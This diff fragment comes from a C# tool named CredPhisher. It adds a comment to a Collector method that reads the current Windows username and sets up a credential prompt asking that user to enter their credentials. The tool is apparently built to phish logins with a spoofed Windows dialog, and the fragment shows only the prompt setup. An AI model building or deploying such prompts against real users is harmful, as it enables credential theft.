@@ -45,6 +45,7 @@ namespace CredPhisher
         public static void Collector(string message, out NetworkCredential networkCredential)
         {
             CREDUI_INFO credui = new CREDUI_INFO();
+            //This block collects the current username and prompts them. This is easily modifiable.
             string username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
             credui.pszCaptionText = message;
             credui.pszMessageText = "Please enter the credentials for " + username;
